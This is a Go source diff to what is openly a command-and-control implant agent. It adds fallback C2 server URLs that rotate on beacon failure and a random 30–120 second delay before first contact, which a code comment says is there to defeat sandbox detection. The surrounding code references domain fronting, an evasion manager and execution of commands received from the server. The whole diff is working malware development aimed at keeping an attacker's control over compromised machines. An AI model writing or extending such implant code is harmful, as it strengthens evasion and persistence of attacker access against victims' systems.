@@ -47,6 +47,10 @@ type AgentConfig struct {
 	// Malleable HTTP profile — controls URIs, headers, and User-Agent pool.
 	Profile *profiles.C2Profile
 
+	// FallbackURLs is a list of alternative C2 URLs tried in order when
+	// ServerURL is unreachable. Rotated automatically on beacon failure.
+	FallbackURLs []string
+
 	// Domain fronting — overrides the HTTP Host header while the TCP connection
 	// still goes to ServerURL (the CDN front). Empty = no fronting.
 	FrontDomain string
@@ -75,11 +79,15 @@ type Agent struct {
 	ID        string
 	cfg       *AgentConfig
 	client    *http.Client
-	crypto    *crypto.Manager   // static key manager (pre-ECDH)
-	sessionMgr *crypto.Manager  // session key manager (post-ECDH); nil until handshake
+	crypto    *crypto.Manager  // static key manager (pre-ECDH)
+	sessionMgr *crypto.Manager // session key manager (post-ECDH); nil until handshake
 	evasion   *EvasionManager
 	timeGate  *agentexec.TimeGate
 	isRunning bool
+
+	// C2 failover — all URLs to try in order (primary + fallbacks)
+	serverURLs   []string
+	serverURLIdx int
 }
 
 // NewAgent constructs and optionally validates the environment
@@ -109,13 +117,22 @@ func NewAgent(cfg *AgentConfig) (*Agent, error) {
 		return nil, fmt.Errorf("cert pin: %w", err)
 	}
 
+	// Build ordered URL list: primary + any fallbacks
+	allURLs := []string{cfg.ServerURL}
+	for _, u := range cfg.FallbackURLs {
+		if u != "" && u != cfg.ServerURL {
+			allURLs = append(allURLs, u)
+		}
+	}
+
 	return &Agent{
-		ID:        generateUUID(),
-		cfg:       cfg,
-		client:    httpClient,
-		crypto:    cryptoMgr,
-		evasion:   evasionMgr,
-		isRunning: false,
+		ID:         generateUUID(),
+		cfg:        cfg,
+		client:     httpClient,
+		crypto:     cryptoMgr,
+		evasion:    evasionMgr,
+		isRunning:  false,
+		serverURLs: allURLs,
 	}, nil
 }
 
@@ -467,6 +484,17 @@ func (a *Agent) Start() error {
 	dbgf("[*] Agent %s starting — transport: %s, interval: %ds ±%d%%\n",
 		a.ID, a.cfg.Transport, a.cfg.Interval, a.cfg.JitterPercent)
 
+	// Pre-beacon jitter: random 30-120 s before first contact.
+	// Prevents sandbox "runs immediately on exec" heuristics.
+	// Skipped in debug builds to keep the dev loop fast.
+	if debugMode != "true" {
+		b := make([]byte, 1)
+		rand.Read(b) //nolint:errcheck
+		delaySec := 30 + int(b[0])%91 // [30, 120]
+		dbgf("[*] Pre-beacon delay: %ds\n", delaySec)
+		a.sleep(time.Duration(delaySec) * time.Second)
+	}
+
 	// Dispatch to alternative transport if configured
 	if t, err := a.newTransport(); err != nil {
 		return fmt.Errorf("transport init: %w", err)
@@ -478,6 +506,7 @@ func (a *Agent) Start() error {
 	for i := 0; i < a.cfg.MaxRetries; i++ {
 		if _, err := a.Beacon(nil); err != nil {
 			dbgf("[!] Beacon attempt %d/%d failed: %v\n", i+1, a.cfg.MaxRetries, err)
+			a.rotateServer()
 			if i == a.cfg.MaxRetries-1 {
 				return fmt.Errorf("initial beacon failed after %d attempts", a.cfg.MaxRetries)
 			}
@@ -520,6 +549,7 @@ func (a *Agent) Start() error {
 		lastResult = nil
 		if err != nil {
 			dbgf("[!] Beacon: %v\n", err)
+			a.rotateServer()
 		} else if cmd != nil {
 			lastResult = ExecuteCommand(a, cmd)
 		}
@@ -531,6 +561,16 @@ func (a *Agent) Start() error {
 
 // Stop halts the beacon loop
 func (a *Agent) Stop() { a.isRunning = false }
+
+// rotateServer advances to the next available C2 URL. Called on beacon failure.
+func (a *Agent) rotateServer() {
+	if len(a.serverURLs) <= 1 {
+		return
+	}
+	a.serverURLIdx = (a.serverURLIdx + 1) % len(a.serverURLs)
+	a.cfg.ServerURL = a.serverURLs[a.serverURLIdx]
+	dbgf("[*] Rotating C2 → %s\n", a.cfg.ServerURL)
+}
 
 // newTransport returns the BeaconTransport for the configured transport type.
 // Returns nil when the transport is "http" (the default HTTP beacon loop is used).
